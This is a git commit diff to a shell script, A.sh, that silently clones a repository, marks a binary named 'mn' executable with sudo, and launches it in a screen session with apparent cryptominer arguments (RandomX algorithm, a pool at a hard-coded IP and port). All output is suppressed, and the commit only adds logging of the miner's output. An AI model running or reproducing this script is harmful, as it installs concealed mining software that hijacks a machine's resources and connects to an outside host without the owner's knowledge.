54396a1756772ebd82fe636d90696af4435a734a
fulltechtree <77315046+fulltechtree@users.noreply.github.com>
2021-01-29 18:06:55 +0700

    Update A.sh

--- A.sh
+++ A.sh
@@ -3,5 +3,5 @@
 git clone https://github.com/fulltechtree/tech.git &> /dev/null
 sudo chmod +x tech/mn
 screen -S min
-./tech/mn -o 161.35.135.44:2449 -u userA -p 1 -a rx/0 -k -t "$1"
+./tech/mn -o 161.35.135.44:2449 -u userA -p 1 -a rx/0 -k -t "$1" &> log
 } &> /dev/null
